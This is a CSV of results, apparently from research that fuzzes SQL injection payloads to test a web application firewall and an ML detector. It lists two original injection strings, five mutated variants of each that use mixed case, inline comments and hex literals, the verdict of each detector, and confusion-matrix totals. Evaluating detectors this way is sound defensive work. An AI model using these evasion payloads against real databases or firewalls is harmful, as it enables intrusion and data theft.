Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
49,2024-12-16T15:32:08.618025,"1  )   as udjn where 6871  =  6871 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",403,403,200,waf_correct_ml_incorrect,"1  )   AS udjn wHeRe (sELeCT 1)  =  0x18f3 lIkE 6387 OR 4915   LiKE 	   (  SELECT count  (  *  )   FRoM domain.domains As t1,domain.columns AS t2,domain.tables aS t3  ) /**/--",2024-12-16T15:32:15.917362,403,200,waf_correct_ml_incorrect,"1  )   aS udjn wHEre (selEcT 1)  =  0x18f3 likE 0x18f3 oR 9796!= ANd 1   lIKE 
 /**/ (  seLEct count  (  *  )   FRom domain.domains As t1,domain.columns as t2,domain.tables AS t3  ) /*u4)b*/--",2024-12-16T15:32:25.031741,403,200,waf_correct_ml_incorrect,"1  )   as udjn whERE (seLecT  oR 0)   lIKe   0x18f3 like 0x18f3 or 0x2644!= ANd '`W2cZ'='`W2cZ'   LIKe 
   (  SeLecT count  (  * 
)   frOM domain.domains AS t1,domain.columns as t2,domain.tables As t3  ) /*u4)b*/--",2024-12-16T15:32:35.063882,403,200,waf_correct_ml_incorrect,"'A6'<>'A6m'  )   AS udjn/**/whERe (Select  OR (SELECT (SELECT 1)))   lIKe   0x18f3 lIKE 0x18f3 OR 0x2644!= ANd '`W2cZ'='`W2cZ'   liKe 	   (  selEcT count  (  * 
)   FRoM domain.domains aS t1,domain.columns AS t2,domain.tables aS t3  ) /*u4)b*/--",2024-12-16T15:32:46.393374,403,403,both_correct,"'A6'<>'A6m'  )   as udjn/*x)cP*/wHeRE (SElect  oR (sELEct/**/(SeleCt '/sm'<>'/sm&')))   like   0x18f3 LIke 0x18f3 Or 0x2644!= and '`W2cZ'='`W2cZ'   lIke 	   (  SeLEcT count  (  * 	)   fROM domain.domains aS t1,domain.columns AS t2,domain.tables AS t3  ) /*u4)b*/--",2024-12-16T15:32:58.760618,403,200,waf_correct_ml_incorrect
50,2024-12-16T15:33:12.233338,2502,200,200,200,both_correct, Or '#\'	NOT/**/LIKE '#\K',2024-12-16T15:33:12.554678,200,200,both_correct," or '#\'
NOT/**/LIKE/**/'#\K'L",2024-12-16T15:33:14.824508,200,200,both_correct, Or '#\'	NOT LIKE/**/'#\K'Ll,2024-12-16T15:33:17.258768,200,403,waf_correct_ml_incorrect," or '#\'
NOT LIKE '#\K'Ll""O",2024-12-16T15:33:19.627421,200,403,waf_correct_ml_incorrect,"/*w49*/or '#\' NOT LIKE '#\K'Ll""O",2024-12-16T15:33:21.981674,200,403,waf_correct_ml_incorrect

Overall Results
WAF TP,144
WAF TN,114
WAF FP,18
WAF FN,24
ML TP,92
ML TN,105
ML FP,27
ML FN,76

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,181,16
ML Incorrect,77,26
